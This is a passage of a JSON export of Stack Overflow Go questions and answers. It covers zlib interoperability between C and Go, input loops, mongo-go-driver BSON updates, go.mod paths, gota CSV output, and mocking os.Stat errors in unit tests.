[{"tags": ["c", "go", "zlib"], "comments": [{"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1540422523, "post_id": 52979075, "comment_id": 92864655, "body": "Isn&#39;t the answer in the question you linked to ? i.e. no you can&#39;t guarentee that the compressed data is similar   - there&#39;s differences in the implementation details  (though  the data compressed in one of them can still be decompressed with the other)"}, {"owner": {"reputation": 15, "user_id": 3657578, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208129906823429/picture?type=large", "display_name": "dante2702", "link": "https://stackoverflow.com/users/3657578/dante2702"}, "reply_to_user": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1540422645, "post_id": 52979075, "comment_id": 92864696, "body": "the decompression in golang for something compressed in C doesn&#39;t seem to work, it exits saying it encountered an EOF"}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1540424620, "post_id": 52979075, "comment_id": 92865195, "body": "the pigz command can&#39;t decompress your first array without an error, neither can gzip if I prepend a gzip header, there is something wrong with the output from your C program.  (Note, some programs will decompress it, e.g. <code>openssl zlib</code> or the <code>zlib-flate</code> command, but they have a rather loose handling of errors from zlib)."}, {"owner": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1540441916, "post_id": 52979075, "comment_id": 92868917, "body": "This is a duplicate of <a href=\"https://stackoverflow.com/questions/52767214/compressed-output-differs-from-go-to-ruby-implementation\">Compressed output differs from Go to Ruby Implementation</a> - ruby uses the same zlib library you use in C."}], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 3657578, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208129906823429/picture?type=large", "display_name": "dante2702", "link": "https://stackoverflow.com/users/3657578/dante2702"}, "edited": false, "score": 0, "creation_date": 1540505437, "post_id": 52979347, "comment_id": 92902213, "body": "that sounds reasonable, i&#39;ll check my C code for zlib compression"}], "tags": [], "owner": {"reputation": 78348, "user_id": 1180620, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/FXaAg.jpg?s=128&g=1", "display_name": "Mark Adler", "link": "https://stackoverflow.com/users/1180620/mark-adler"}, "is_accepted": true, "score": 3, "last_activity_date": 1540424312, "creation_date": 1540424312, "answer_id": 52979347, "question_id": 52979075, "link": "https://stackoverflow.com/questions/52979075/how-do-i-use-zlib-to-compress-in-c-and-uncompress-in-golang/52979347#52979347", "title": "how do I use zlib to compress in C and uncompress in golang", "body": "<p>Comparing compressed data tells you nothing. Different compressors, or different versions of the same compressor, or the same version used with different settings, can all give different compressed output for the same input. What actually matters for a lossless compressor is whether you can decompress to the original data.</p>\n\n<p>The problem with your first example is that it is not complete. (The second example is complete and correct.) The first example ends in the middle of a deflate block. There is an error in your usage of zlib, either in managing the resulting data or not properly requesting the completion of the compression.</p>\n"}], "owner": {"reputation": 15, "user_id": 3657578, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208129906823429/picture?type=large", "display_name": "dante2702", "link": "https://stackoverflow.com/users/3657578/dante2702"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 384, "favorite_count": 1, "accepted_answer_id": 52979347, "answer_count": 1, "score": 1, "last_activity_date": 1540424312, "creation_date": 1540422181, "question_id": 52979075, "link": "https://stackoverflow.com/questions/52979075/how-do-i-use-zlib-to-compress-in-c-and-uncompress-in-golang", "title": "how do I use zlib to compress in C and uncompress in golang", "body": "<p>So I have been trying to convert some data from C to be compressed and sent to a library which is in golang where it will be decompressed.\nonly issue is, they seem to be slightly different implementations from each other.</p>\n\n<p>What i did was to use \"zlib.h\" library from C to compress the string \"hello\" which resulted in bytes of </p>\n\n<pre><code>[120 156 203 72 205 201 201 103 32 5]\n</code></pre>\n\n<p>while in golang for the same string \"hello\" results in an array of </p>\n\n<pre><code>[120 156 202 72 205 201 201 7 4 0 0 255 255 6 44 2 21]\n</code></pre>\n\n<p>My question is if there is a way to make these outputs similar , what is it? or at the very least can a compressed data in C be decompressed in zlib?</p>\n\n<p>I've also looked at <a href=\"https://stackoverflow.com/questions/27852940/how-can-i-use-zlib-in-golang-to-cooperate-with-zlib-in-c\">How can I use zlib in golang to cooperate with zlib in c?</a> but i'm looking for something more specific like an example.</p>\n"}, {"tags": ["go", "command-line-interface"], "comments": [{"owner": {"reputation": 1255, "user_id": 4982148, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/X52Wq.jpg?s=128&g=1", "display_name": "atakanyenel", "link": "https://stackoverflow.com/users/4982148/atakanyenel"}, "edited": false, "score": 1, "creation_date": 1540421844, "post_id": 52978990, "comment_id": 92864463, "body": "You have to put this block in a loop. and check the answer everytime until the loop can exit. There is no golang specific problem here"}], "answers": [{"tags": [], "owner": {"reputation": 551, "user_id": 10554768, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d0874152f77551e2be38904d25e5822e?s=128&d=identicon&r=PG&f=1", "display_name": "robert", "link": "https://stackoverflow.com/users/10554768/robert"}, "is_accepted": true, "score": 2, "last_activity_date": 1540422188, "creation_date": 1540422188, "answer_id": 52979079, "question_id": 52978990, "link": "https://stackoverflow.com/questions/52978990/if-user-enter-not-correct-data-app-must-repeats-question/52979079#52979079", "title": "If user enter not correct data app must repeats question", "body": "<p>You can use a while loop (for in Go) to continuously loop until you get an input you want. </p>\n\n<pre><code>var keepRepeating = true\n\nscanner := bufio.NewScanner(os.Stdin)\n\nfor keepRepeating {\n\n    fmt.Println(\"Enter y/n\")    \n    scanner.Scan()\n    if scanner.Text() == \"y\" {\n        keepRepeating = false\n    }\n    if scanner.Text() == \"n\" {\n        keepRepeating = false       \n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 5693313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8937939472837b84c63c4d91a514f32d?s=128&d=identicon&r=PG&f=1", "display_name": "Solovyeff", "link": "https://stackoverflow.com/users/5693313/solovyeff"}, "is_accepted": false, "score": 1, "last_activity_date": 1540423458, "creation_date": 1540423458, "answer_id": 52979239, "question_id": 52978990, "link": "https://stackoverflow.com/questions/52978990/if-user-enter-not-correct-data-app-must-repeats-question/52979239#52979239", "title": "If user enter not correct data app must repeats question", "body": "<p>Thanks, everyone! I did so:</p>\n\n<pre><code>for {\n    fmt.Println(\"yes or no:\")\n    if _, err := fmt.Scan(&amp;str); err != nil {\n        panic(err)\n    }\n    if str == \"no\" {\n        fmt.Println(\"enter again\")\n    } else {\n        break\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 5693313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8937939472837b84c63c4d91a514f32d?s=128&d=identicon&r=PG&f=1", "display_name": "Solovyeff", "link": "https://stackoverflow.com/users/5693313/solovyeff"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "accepted_answer_id": 52979079, "answer_count": 2, "score": 0, "last_activity_date": 1540423458, "creation_date": 1540421599, "question_id": 52978990, "link": "https://stackoverflow.com/questions/52978990/if-user-enter-not-correct-data-app-must-repeats-question", "title": "If user enter not correct data app must repeats question", "body": "<p>everyone! I'm newbie in Golang and I've a problem.\nI've some code like this (just example):</p>\n\n<pre><code>fmt.Println(\"yes or no:\")\nif _, err := fmt.Scan(&amp;str); err != nil {\n    panic(err)\n}\nif str == \"no\" {\n    fmt.Println(\"You have to enter yes.\")\n    //What do I need to write this?\n}\n</code></pre>\n\n<p>I wont it shows the question \"yes or no\" again til an user enters correct data or terminate proccess.</p>\n"}, {"tags": ["mongodb", "go"], "comments": [{"owner": {"reputation": 665, "user_id": 4411182, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-y6ywJeM9H7I/AAAAAAAAAAI/AAAAAAAAAHY/NY5Ggehfnxc/photo.jpg?sz=128", "display_name": "George Edward Shaw IV", "link": "https://stackoverflow.com/users/4411182/george-edward-shaw-iv"}, "edited": false, "score": 0, "creation_date": 1540478658, "post_id": 52978533, "comment_id": 92889360, "body": "I&#39;m not normally one to advocate for something like this, but I just finished a big mongo/go project a few weeks ago. I would highly advise against using the <code>mongo-go-driver</code> and instead use <a href=\"https://github.com/globalsign/mgo\" rel=\"nofollow noreferrer\">globalsign/mgo</a> which is a fork of <code>mgo</code> that is still being maintained. Even though <code>mongo-go-driver</code> is the &quot;official mongo driver for go&quot;, it is very undocumented, under developed, a way bigger dependency than it needs to be, and the code looks rushed. Not trying to bash the package, but I would give that package some more time before using it in production code."}, {"owner": {"reputation": 13, "user_id": 6888427, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a444e844d5bee0b3b22c15c3af2ff88?s=128&d=identicon&r=PG&f=1", "display_name": "M. Kolehmainen", "link": "https://stackoverflow.com/users/6888427/m-kolehmainen"}, "reply_to_user": {"reputation": 665, "user_id": 4411182, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-y6ywJeM9H7I/AAAAAAAAAAI/AAAAAAAAAHY/NY5Ggehfnxc/photo.jpg?sz=128", "display_name": "George Edward Shaw IV", "link": "https://stackoverflow.com/users/4411182/george-edward-shaw-iv"}, "edited": false, "score": 0, "creation_date": 1540556055, "post_id": 52978533, "comment_id": 92920432, "body": "@GeorgeEdwardShawIV - thanks for the tip. The mongo-go-driver has been driving me crazy."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 6888427, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a444e844d5bee0b3b22c15c3af2ff88?s=128&d=identicon&r=PG&f=1", "display_name": "M. Kolehmainen", "link": "https://stackoverflow.com/users/6888427/m-kolehmainen"}, "edited": false, "score": 0, "creation_date": 1540566330, "post_id": 52981484, "comment_id": 92926454, "body": "Agree. I&#39;ve switched to globalsign/mgo as suggested."}], "tags": [], "owner": {"reputation": 750, "user_id": 2947756, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qpCxL.png?s=128&g=1", "display_name": "xReprisal", "link": "https://stackoverflow.com/users/2947756/xreprisal"}, "is_accepted": true, "score": 0, "last_activity_date": 1540442570, "creation_date": 1540442570, "answer_id": 52981484, "question_id": 52978533, "link": "https://stackoverflow.com/questions/52978533/how-to-convert-from-a-struct-to-a-document-with-mongo-go-driver/52981484#52981484", "title": "How to convert from a struct to a document with mongo-go-driver", "body": "<p>You are right, there is a simpler way to go about this:</p>\n\n<pre><code>newProj := &amp;Project{\n    ID: objectid.New(),\n    Name: \"foo\",\n}\n\nupd := bson.M{\n    \"$push\": bson.M{\"proj\": newProj},\n}\n</code></pre>\n\n<p>I'm using <code>github.com/globalsign/mgo/bson</code></p>\n"}], "owner": {"reputation": 13, "user_id": 6888427, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7a444e844d5bee0b3b22c15c3af2ff88?s=128&d=identicon&r=PG&f=1", "display_name": "M. Kolehmainen", "link": "https://stackoverflow.com/users/6888427/m-kolehmainen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1611, "favorite_count": 0, "accepted_answer_id": 52981484, "answer_count": 1, "score": 1, "last_activity_date": 1540442570, "creation_date": 1540418710, "question_id": 52978533, "link": "https://stackoverflow.com/questions/52978533/how-to-convert-from-a-struct-to-a-document-with-mongo-go-driver", "title": "How to convert from a struct to a document with mongo-go-driver", "body": "<p>I'm trying to use <code>$push</code> to put a go struct into a mongo array.  The go documents, which I've simplified for this example, look like this:</p>\n\n<pre><code>type Main struct {\n   ID       objectid.ObjectID `bson:\"_id\"`\n   Projects []*Project        `bson:\"proj\"`\n}\n\ntype Project struct {\n   ID    objectid.ObjectID `bson:\"_id\"`\n   Name  string            `bson:\"name\"`\n}\n</code></pre>\n\n<p>What I want to do is <code>$push</code> a new <code>Project</code> onto the <code>Main.Projects</code> array. What I've ended up doing is quite painful, so I'm hoping there is a better way.  See here:</p>\n\n<pre><code>// Create the new project struct:\nnewProj := &amp;Project{\n  ID: objectid.New(),\n  Name: \"foo\",\n}\n\n// Then marshall bson:\nbsbuf, err := bsoncodec.Marshal(newProj)\nif err != nil {\n    // ...\n}\n\n// Next read the bytes into a document:\nbsonDoc, err := bson.ReadDocument(bsbuf)\nif err != nil {\n    // ...\n}\n\n// Now create the update document:\nupd := bson.NewDocument(\n    bson.EC.SubDocument(\"$push\", bson.NewDocument(\n        bson.EC.SubDocument(\"proj\", bsonDoc))))\n\n// And perform update as usual\n// ... not shown ...\n</code></pre>\n\n<p>Is it really necessary to transcode to a byte buffer, then read into a document?  I was hoping for something like:</p>\n\n<pre><code>...\nbson.EC.GoStruct(\"proj\", newProj)\n...\n</code></pre>\n\n<p>I did try <code>bson.EC.Interface(\"proj\", newProj)</code> but that just inserted nulls into the array.  I am curious to know how others are doing this sort of thing.</p>\n"}, {"tags": ["go", "go-modules"], "answers": [{"comments": [{"owner": {"reputation": 1257, "user_id": 819581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/fcfdb14c9ffb96623a9e78b9a0412016?s=128&d=identicon&r=PG", "display_name": "Rocky", "link": "https://stackoverflow.com/users/819581/rocky"}, "edited": false, "score": 0, "creation_date": 1543887751, "post_id": 52978302, "comment_id": 94071345, "body": "I had the same problem ;("}, {"owner": {"reputation": 1257, "user_id": 819581, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/fcfdb14c9ffb96623a9e78b9a0412016?s=128&d=identicon&r=PG", "display_name": "Rocky", "link": "https://stackoverflow.com/users/819581/rocky"}, "edited": false, "score": 0, "creation_date": 1543888696, "post_id": 52978302, "comment_id": 94071530, "body": "<a href=\"https://stackoverflow.com/questions/53604560/go-cannot-determine-module-path-for-source-directory\" title=\"go cannot determine module path for source directory\">stackoverflow.com/questions/53604560/&hellip;</a>"}], "tags": [], "owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "is_accepted": false, "score": 3, "last_activity_date": 1540417359, "creation_date": 1540417359, "answer_id": 52978302, "question_id": 52978070, "link": "https://stackoverflow.com/questions/52978070/cannot-determine-module-path-for-source-directory/52978302#52978302", "title": "Cannot determine module path for source directory", "body": "<p>It's hard to say anything with certainty without seeing the actual commands you run, by it seems your scripts do not change the working directory, and therefore the <code>go</code> commands they execute are not in the module's root folder or any of its subfolders.</p>\n\n<p>Quoting from <a href=\"https://golang.org/cmd/go/#hdr-The_go_mod_file\" rel=\"nofollow noreferrer\">Command Go: The go.mod file:</a></p>\n\n<blockquote>\n  <p>A module version is defined by a tree of source files, with a go.mod file in its root. When the go command is run, it looks in the current directory and then successive parent directories to find the go.mod marking the root of the main (current) module.</p>\n</blockquote>\n\n<p>So your scripts should change the working directory to <code>root/src/abc</code> or any of its subfolders, else the go command will not find the <code>go.mod</code> file.</p>\n"}], "owner": {"reputation": 179, "user_id": 3168473, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/63399da3f0e6188eb8bc10d12da28d2b?s=128&d=identicon&r=PG&f=1", "display_name": "Batman Rises", "link": "https://stackoverflow.com/users/3168473/batman-rises"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5666, "favorite_count": 1, "answer_count": 1, "score": 9, "last_activity_date": 1565079572, "creation_date": 1540416099, "last_edit_date": 1565079572, "question_id": 52978070, "link": "https://stackoverflow.com/questions/52978070/cannot-determine-module-path-for-source-directory", "title": "Cannot determine module path for source directory", "body": "<p>I have <code>go.mod</code> file inside <code>root/src/abc</code>. And in <code>root/build-scripts</code> I have a script which does <code>go get</code>. As I am using Go 1.11 I have not used the go path instead the mod file in <code>root/src/abc</code> takes care of other imports except for the packages that are being used in build script which gives error:</p>\n\n<blockquote>\n  <p>go: cannot determine module path for source directory. </p>\n</blockquote>\n\n<p>Any suggestions?</p>\n"}, {"tags": ["go", "gota"], "answers": [{"tags": [], "owner": {"reputation": 197, "user_id": 7299284, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-CW24NJaZ0QU/AAAAAAAAAAI/AAAAAAAAAAo/8EtvCR46EQ0/photo.jpg?sz=128", "display_name": "Jonathan Steele", "link": "https://stackoverflow.com/users/7299284/jonathan-steele"}, "is_accepted": true, "score": 4, "last_activity_date": 1543432055, "last_edit_date": 1543432055, "creation_date": 1540414256, "answer_id": 52977735, "question_id": 52977734, "link": "https://stackoverflow.com/questions/52977734/how-do-i-write-a-gota-dataframe-to-a-csv/52977735#52977735", "title": "How do I write a gota dataframe to a csv?", "body": "<p>So it turns out I misunderstood the io.Writer interface and I didn't understand what the os.Create() function returns. </p>\n\n<p>It turns out the code is even simpler and easier than I thought it would be.</p>\n\n<p>Here is the working code example:</p>\n\n<pre><code>df := dataframe.LoadStructs(file.Rows)\n\nf, err := os.Create(outFileName)\nif err != nil {\n    log.Fatal(err)\n}\n\ndf.WriteCSV(f)\n</code></pre>\n"}], "owner": {"reputation": 197, "user_id": 7299284, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-CW24NJaZ0QU/AAAAAAAAAAI/AAAAAAAAAAo/8EtvCR46EQ0/photo.jpg?sz=128", "display_name": "Jonathan Steele", "link": "https://stackoverflow.com/users/7299284/jonathan-steele"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 768, "favorite_count": 0, "accepted_answer_id": 52977735, "answer_count": 1, "score": 1, "last_activity_date": 1543432055, "creation_date": 1540414256, "last_edit_date": 1540453683, "question_id": 52977734, "link": "https://stackoverflow.com/questions/52977734/how-do-i-write-a-gota-dataframe-to-a-csv", "title": "How do I write a gota dataframe to a csv?", "body": "<p>I have found many many code examples of writing to a CSV by passing in a [][]string. (like the following):</p>\n\n<pre><code>package main\n\nimport (\n    \"os\"\n    \"log\"\n    \"encoding/csv\"\n)\n\nvar data = [][]string{\n    {\"Row 1\", \"30\"}, \n    {\"Row 2\", \"60\"},\n    {\"Row 3\", \"90\"}}\n\nfunc main() {\n    file, err := os.Create(\"tutorials_technology.csv\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer file.Close()\n\n    w := csv.NewWriter(file) \n\n    for _, value := range data {\n        if err := w.Write(value); err != nil {\n            log.Fatalln(\"Error writing record to csv: \", err)\n        }\n    }\n    w.Flush()\n}\n</code></pre>\n\n<p>However, <strong>I haven't found any code examples that show how to use the <a href=\"https://github.com/kniren/gota\" rel=\"nofollow noreferrer\">gota</a> dataframe.WriteCSV() function to write to a CSV.</strong> In the gota <a href=\"https://godoc.org/github.com/kniren/gota/dataframe\" rel=\"nofollow noreferrer\">dataframe documentation</a>, there isn't an example for writing to a csv, but there is an example for reading from a csv. </p>\n\n<p>The dataframe function WriteCSV() requires an input of the io.Writer{} interface. I wasn't sure how to satsify that.</p>\n\n<p>The following didn't work</p>\n\n<pre><code>writer := csv.NewWriter(f)\n\ndf.WriteCSV(writer) // TODO This writer needs to be a []byte writer\n</code></pre>\n\n<p>I've been working on this for quite a while. Does anyone have any clues?</p>\n\n<p>I have looked into turning my gota dataframe into a [][]string type, but that's a little inconvenient because I put my data into a gota dataframe with the package's LoadStructs() function and I had read in some CSV in a semi-custom way before putting them into structs. </p>\n\n<p>So I could write a function to turn my structs into a [][]string format, but I feel like that is pretty tedious and I'm sure there has got to be a better way. In fact, I'm sure there is because the dataframe type has the WriteCSV() method but I just haven't figured out how to use it.</p>\n\n<p>Here are my structs</p>\n\n<pre><code>type CsvLine struct {\n    Index  int\n    Date   string\n    Symbol string\n    Open   float64\n    High   float64\n    Low    float64\n    Close  float64\n    // Volume float64\n    // Market_Cap float64\n}\n\ntype File struct {\n    Rows []CsvLine\n}\n</code></pre>\n\n<p>Disclaimer: I am a little bit of a golang newbie. I've only been using Go for a couple months, and this is the first time I've tried to write to a file. I haven't interacted much with the io.Writer interface, but I hear that it's very useful. </p>\n\n<p>And yes, I frequently look at the Golang.org blog and I've read \"Effective Go\" and I keep referencing it. </p>\n"}, {"tags": ["unit-testing", "go"], "comments": [{"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540411149, "post_id": 52976701, "comment_id": 92860546, "body": "Try to stat a path that you don&#39;t have permission to access the containing directory."}, {"owner": {"reputation": 3022, "user_id": 2027839, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/f0cdfc83802dff15a73a5c273c1b4154?s=128&d=identicon&r=PG", "display_name": "Mike Warren", "link": "https://stackoverflow.com/users/2027839/mike-warren"}, "reply_to_user": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540411819, "post_id": 52976701, "comment_id": 92860850, "body": "How do you do that from the unit testing environment though"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540412082, "post_id": 52976701, "comment_id": 92860984, "body": "The error codes handled in *nix environments are EAGAIN, EINVAL, and ENOENT: <a href=\"https://golang.org/src/syscall/syscall_unix.go#L139\" rel=\"nofollow noreferrer\">golang.org/src/syscall/syscall_unix.go#L139</a>"}, {"owner": {"reputation": 3022, "user_id": 2027839, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/f0cdfc83802dff15a73a5c273c1b4154?s=128&d=identicon&r=PG", "display_name": "Mike Warren", "link": "https://stackoverflow.com/users/2027839/mike-warren"}, "edited": false, "score": 0, "creation_date": 1540412523, "post_id": 52976701, "comment_id": 92861195, "body": "OK, now how do you <b>cause</b> those errors (except the last one, which is obviously &quot;file not found&quot;)? That is the question."}, {"owner": {"reputation": 8724, "user_id": 1068283, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/XZLfw.jpg?s=128&g=1", "display_name": "Michael Hampton", "link": "https://stackoverflow.com/users/1068283/michael-hampton"}, "edited": false, "score": 0, "creation_date": 1540590804, "post_id": 52976701, "comment_id": 92936960, "body": "That depends on your unit testing environment. But there&#39;s plenty of stuff you should have no access to, for instance anything under <code>&#47;root</code>. Try stating <code>&#47;root&#47;.ssh&#47;authorized_keys</code> as non-root you should get a nice error which isn&#39;t <code>IsNotExist()</code>. The error you get back from that is <code>&amp;os.PathError{Op:&quot;stat&quot;, Path:&quot;&#47;root&#47;.ssh&#47;authorized_keys&quot;, Err:0xd}</code> or as a string <code>stat &#47;root&#47;.ssh&#47;authorized_keys: permission denied</code>"}], "answers": [{"comments": [{"owner": {"reputation": 17373, "user_id": 75517, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/404fabbcb3e36bac8da7d1904d260ec0?s=128&d=identicon&r=PG", "display_name": "chmike", "link": "https://stackoverflow.com/users/75517/chmike"}, "edited": false, "score": 0, "creation_date": 1615820891, "post_id": 53016363, "comment_id": 117803184, "body": "nice trick, but it won\u2019t work with the Stat() method of *os.File. One need a boolean <code>testError</code> which is set to false by default. The test is changed into  <code>if _, err := osStat(path); err != nil || testError {</code> and the boolean is set to true in the test function when we want the test to be true."}], "tags": [], "owner": {"reputation": 358, "user_id": 6267238, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b53d46b675ae20a5956ccc01ec32faa6?s=128&d=identicon&r=PG&f=1", "display_name": "Jason Carlson", "link": "https://stackoverflow.com/users/6267238/jason-carlson"}, "is_accepted": true, "score": 2, "last_activity_date": 1540591622, "last_edit_date": 1540591622, "creation_date": 1540588368, "answer_id": 53016363, "question_id": 52976701, "link": "https://stackoverflow.com/questions/52976701/making-os-stat-throw-error-such-that-isnotexist-returns-false/53016363#53016363", "title": "Making os.Stat throw error such that IsNotExist returns false", "body": "<p>I think you will find it very difficult to control what errors are thrown and when by <code>os.Stat</code> in a platform independent way from a unit test. If you really need a test for the path where an unknown error type is returned, your best bet might be to refactor your package code so that you can mock <code>os.Stat</code>. Although you can't change the behavior of <code>os.Stat</code> directly, by taking advantage of the fact that Go has first-class functions, you can use a bit of indirection to mock it with very minimal changes to your code. If your package code looks like this: </p>\n\n<pre><code>package mypackage\n\nimport \"os\"\n\n...\n\n    if _, err := os.Stat(path); err != nil {\n        if os.IsNotExist(err) {\n           continue\n        }\n        return errors.File().AddDetails(err)\n    }\n\n...\n</code></pre>\n\n<p>Try refactoring it to use a non-exported package-scope function variable which is assigned <code>os.Stat</code>:</p>\n\n<pre><code>package mypackage\n\nimport \"os\"\n\nvar osStat = os.Stat\n\n...\n\n    if _, err := osStat(path); err != nil {\n        if os.IsNotExist(err) {\n           continue\n        }\n        return errors.File().AddDetails(err)\n    }\n\n...\n</code></pre>\n\n<p>Now, in your test code (which should be in the same package as the code under test), you can reassign <code>osStat</code> to any function with the same signature in order to mock it:</p>\n\n<pre><code>package mypackage\n\nimport (\n        \"os\"\n        \"testing\"\n)\n\nfunc TestNotExistError(t *testing.T) {\n    osStat = func(string) (os.FileInfo, error) {\n        return nil, os.ErrNotExist\n    }\n    // in case other test functions depend on the unmocked behavior\n    defer func() {\n        osStat = os.Stat\n    }()\n\n    // rest of the test which triggers the codepath above\n}\n\nfunc TestOtherError(t *testing.T) {\n    osStat = func(string) (os.FileInfo, error) {\n        return nil, os.ErrInvalid\n    }\n    // in case other test functions depend on the unmocked behavior\n    defer func() {\n        osStat = os.Stat\n    }()\n\n    // rest of the test which triggers the codepath above\n}\n\n...\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 5458056, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7b03f3559b27c27af398d5480ecc3434?s=128&d=identicon&r=PG&f=1", "display_name": "stackbykumbi", "link": "https://stackoverflow.com/users/5458056/stackbykumbi"}, "is_accepted": false, "score": 2, "last_activity_date": 1616710479, "creation_date": 1616710479, "answer_id": 66808328, "question_id": 52976701, "link": "https://stackoverflow.com/questions/52976701/making-os-stat-throw-error-such-that-isnotexist-returns-false/66808328#66808328", "title": "Making os.Stat throw error such that IsNotExist returns false", "body": "<p>You can cause an error such that <code>IsNotExist</code> returns false by passing an invalid filename.</p>\n<pre class=\"lang-golang prettyprint-override\"><code>package main\n\nimport (\n    &quot;fmt&quot;\n    &quot;os&quot;\n)\n\nfunc main() {\n    _, err := os.Stat(&quot;\\000x&quot;)\n    fmt.Println(err)\n\n    // prints:\n    // \n    // stat x: invalid argument\n}\n</code></pre>\n<p><code>\\000\u202f(ASCII: NUL)</code> is an invalid character in unix file names.</p>\n"}], "owner": {"reputation": 3022, "user_id": 2027839, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/f0cdfc83802dff15a73a5c273c1b4154?s=128&d=identicon&r=PG", "display_name": "Mike Warren", "link": "https://stackoverflow.com/users/2027839/mike-warren"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1092, "favorite_count": 0, "accepted_answer_id": 53016363, "answer_count": 2, "score": 2, "last_activity_date": 1616710479, "creation_date": 1540409761, "question_id": 52976701, "link": "https://stackoverflow.com/questions/52976701/making-os-stat-throw-error-such-that-isnotexist-returns-false", "title": "Making os.Stat throw error such that IsNotExist returns false", "body": "<p>I'm trying to test the following branch: </p>\n\n<pre><code>if _, err := os.Stat(path); err != nil {\n        if os.IsNotExist(err) {\n            continue\n        }\n        return errors.File().AddDetails(err)\n    }\n</code></pre>\n\n<p>Obviously, <code>os.Stat</code> is going to throw an error if <code>path</code> doesn't exist. <a href=\"https://golang.org/pkg/os/#Stat\" rel=\"nofollow noreferrer\">Reading the Golang documentation</a> returns no details about the errors that <code>os.Stat</code> could return. Is there way to have <code>os.Stat</code> throw another kind of error?</p>\n"}, {"tags": ["go", "concurrency"], "comments": [{"owner": {"reputation": 12516, "user_id": 302268, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/c3985dffcdc646b67ed0699a364639e2?s=128&d=identicon&r=PG", "display_name": "Mad Wombat", "link": "https://stackoverflow.com/users/302268/mad-wombat"}, "edited": false, "score": 1, "creation_date": 1540404333, "post_id": 52975260, "comment_id": 92857293, "body": "I think it has something to do with the fact that you are using a buffered channel. If you change the cap(c) to a hard value and remove the 10 from the make() it will get interleaved as expected. I think the goroutine just runs too fast and stuffs all the values into the channel before the results can be read. But if the channel is unbuffered, goroutine blocks on every channel read/write and then everything happens simultaneously"}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": 